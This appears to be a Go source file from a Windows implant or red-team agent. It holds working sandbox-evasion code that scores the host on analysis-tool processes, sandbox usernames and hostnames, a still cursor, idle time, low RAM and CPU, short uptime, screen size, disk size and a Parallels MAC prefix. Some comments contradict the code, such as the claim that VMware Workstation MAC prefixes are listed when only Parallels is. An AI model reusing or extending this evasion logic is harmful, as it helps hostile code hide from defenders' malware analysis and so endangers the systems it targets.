//go:build windows

package agent

import (
	"net"
	"os"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernel32          = windows.NewLazySystemDLL("kernel32.dll")
	modUser32sb          = windows.NewLazySystemDLL("user32.dll")
	procGlobalMemStat    = modKernel32.NewProc("GlobalMemoryStatusEx")
	procGetLastInput     = modUser32sb.NewProc("GetLastInputInfo")
	procGetTick64        = modKernel32.NewProc("GetTickCount64")
	procGetCursorPos     = modUser32sb.NewProc("GetCursorPos")
	procSleepSb          = modKernel32.NewProc("Sleep")
	procGetDiskFreeSpace = modKernel32.NewProc("GetDiskFreeSpaceExW")
	procGetSysMetrics    = modUser32sb.NewProc("GetSystemMetrics")
	// procCreateToolhelp32Snapshot, procProcess32First, procProcess32Next
	// and processEntry32 are shared with minidump_windows.go
)

// memoryStatusEx mirrors the Windows MEMORYSTATUSEX struct.
type memoryStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

type lastInputInfo struct {
	cbSize uint32
	dwTime uint32
}

type cursorPoint struct{ X, Y int32 }

// checkMouseActivity samples the cursor position twice 500 ms apart.
// Returns true if the mouse did not move — a strong sandbox indicator since
// automated analysis environments do not simulate user interaction.
func checkMouseActivity() bool {
	var p1, p2 cursorPoint
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p1)))
	procSleepSb.Call(500)
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p2)))
	return p1.X == p2.X && p1.Y == p2.Y
}

// hasSandboxProcess returns true if a process associated with automated
// malware analysis environments is found running.
func hasSandboxProcess() bool {
	const TH32CS_SNAPPROCESS = 0x00000002
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == uintptr(syscall.InvalidHandle) {
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(snap))

	// Known sandbox / analysis tool process names (lowercase)
	badProcs := map[string]bool{
		"vboxservice.exe": true, // VirtualBox guest service (sandbox, not ESXi)
		"vboxtray.exe":    true, // VirtualBox tray (sandbox)
		"vmtoolsd.exe":    true, // VMware tools (Workstation sandbox, not ESXi)
		"vmwaretray.exe":  true, // VMware tray
		"vmwareuser.exe":  true, // VMware user process
		"wireshark.exe":   true, // Network capture — typical in sandbox but not on real targets
		"fiddler.exe":     true, // HTTP proxy used in sandboxes
		"processhacker.exe": true,
		"procmon.exe":     true, // Sysinternals process monitor
		"procmon64.exe":   true,
		"regmon.exe":      true,
		"filemon.exe":     true,
		"cuckoo.exe":      true,
		"agent.exe":       true, // Cuckoo agent process name
		"analyzer.exe":    true, // Cuckoo analyzer
		"sniffit.exe":     true,
		"joeboxserver.exe": true, // Joe Sandbox
		"joeboxcontrol.exe": true,
	}

	var pe processEntry32
	pe.dwSize = uint32(unsafe.Sizeof(pe))
	ret, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&pe)))
	for ret != 0 {
		name := strings.ToLower(syscall.UTF16ToString(pe.szExeFile[:]))
		if badProcs[name] {
			return true
		}
		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return false
}

// sandboxMACs lists MAC prefixes used by sandbox-only virtualisation stacks.
// ESXi (00:50:56), Proxmox/QEMU (52:54:00), Hyper-V and Xen are intentionally
// excluded — they are common enterprise / pentest-lab hypervisors. Only
// VMware Workstation and Parallels (desktop consumer products predominantly
// used to build sandbox VMs, not production targets) are listed.
var sandboxMACs = [][3]byte{
	{0x00, 0x1C, 0x42}, // Parallels Desktop
}

// hasSandboxMAC returns true only for MAC prefixes that exclusively appear in
// desktop sandbox products.
func hasSandboxMAC() bool {
	ifaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, iface := range ifaces {
		mac := iface.HardwareAddr
		if len(mac) < 3 {
			continue
		}
		for _, p := range sandboxMACs {
			if mac[0] == p[0] && mac[1] == p[1] && mac[2] == p[2] {
				return true
			}
		}
	}
	return false
}

// isSandbox uses a scoring model: each indicator contributes points and the
// environment is treated as an automated analysis sandbox when the total meets
// the threshold. The design principle is behavioral over hardware:
//   - Hardware checks (VM vendor, disk size) are weak signals; real pentest
//     targets are often VMs with small disks.
//   - Behavioral checks (no mouse movement, no user input, known analysis
//     tools, timing tricks) are strong signals specific to sandboxes.
func isSandbox() bool {
	const threshold = 4
	score := 0

	// ── Sandbox usernames (+3 each, enough alone) ────────────────────────────
	user := strings.ToLower(os.Getenv("USERNAME"))
	for _, n := range []string{
		"sandbox", "malware", "virus", "cuckoo", "analyst",
		"maltest", "vmuser", "wilbert", "klone", "tequilaboomboom",
		"john", "joe", "sample",
	} {
		if user == n {
			score += 3
			break
		}
	}

	// ── Sandbox hostnames (+3 each, enough alone) ────────────────────────────
	hostname, _ := os.Hostname()
	hn := strings.ToLower(hostname)
	for _, h := range []string{
		"sandbox", "cuckoo", "malware", "virus", "win7malware",
		"maltest", "analysis", "anyrun",
	} {
		if strings.Contains(hn, h) {
			score += 3
			break
		}
	}

	// ── Known analysis tool process running (+2) ─────────────────────────────
	if hasSandboxProcess() {
		score += 2
	}

	// ── Mouse has not moved in 500 ms (+2) ───────────────────────────────────
	// Automated sandboxes do not simulate cursor movement.
	if checkMouseActivity() {
		score += 2
	}

	// ── No user input in the last 10 minutes (+1) ────────────────────────────
	// A machine actively used by a person will have recent keyboard/mouse input.
	var lii lastInputInfo
	lii.cbSize = uint32(unsafe.Sizeof(lii))
	procGetLastInput.Call(uintptr(unsafe.Pointer(&lii)))
	if tickMs, _, _ := procGetTick64.Call(); tickMs > 0 && lii.dwTime > 0 {
		idleMs := uint64(tickMs) - uint64(lii.dwTime)
		if idleMs > 10*60*1000 {
			score++
		}
	}

	// ── RAM ──────────────────────────────────────────────────────────────────
	var ms memoryStatusEx
	ms.dwLength = uint32(unsafe.Sizeof(ms))
	procGlobalMemStat.Call(uintptr(unsafe.Pointer(&ms)))
	if ms.ullTotalPhys > 0 {
		if ms.ullTotalPhys < 512*1024*1024 {
			score += 3 // virtually impossible on any real target
		} else if ms.ullTotalPhys < 1*1024*1024*1024 {
			score++
		}
	}

	// ── CPU cores < 2 (+1) ───────────────────────────────────────────────────
	if runtime.NumCPU() < 2 {
		score++
	}

	// ── System uptime < 5 min (+1) ───────────────────────────────────────────
	// Sandboxes are spun up fresh for each sample.
	if upMs, _, _ := procGetTick64.Call(); upMs > 0 && upMs < 5*60*1000 {
		score++
	}

	// ── Screen 800×600 (+1) ──────────────────────────────────────────────────
	// Classic automated sandbox resolution; worth only 1 pt since servers
	// and RDP sessions may also use this resolution.
	if cx, _, _ := procGetSysMetrics.Call(0); int(cx) == 800 {
		if cy, _, _ := procGetSysMetrics.Call(1); int(cy) == 600 {
			score++
		}
	}

	// ── Disk C: < 40 GB (+1) ─────────────────────────────────────────────────
	cDrive := [4]uint16{'C', ':', '\\', 0}
	var totalBytes uint64
	procGetDiskFreeSpace.Call(
		uintptr(unsafe.Pointer(&cDrive[0])),
		0,
		uintptr(unsafe.Pointer(&totalBytes)),
		0,
	)
	if totalBytes > 0 && totalBytes < 40*1024*1024*1024 {
		score++
	}

	// ── Sandbox-only MAC prefix (+1) ─────────────────────────────────────────
	// Only Parallels Desktop remains — VMware Workstation and VirtualBox are
	// excluded because they are widely used in pentest labs and corporate
	// desktop virtualisation.
	if hasSandboxMAC() {
		score++
	}

	return score >= threshold
}
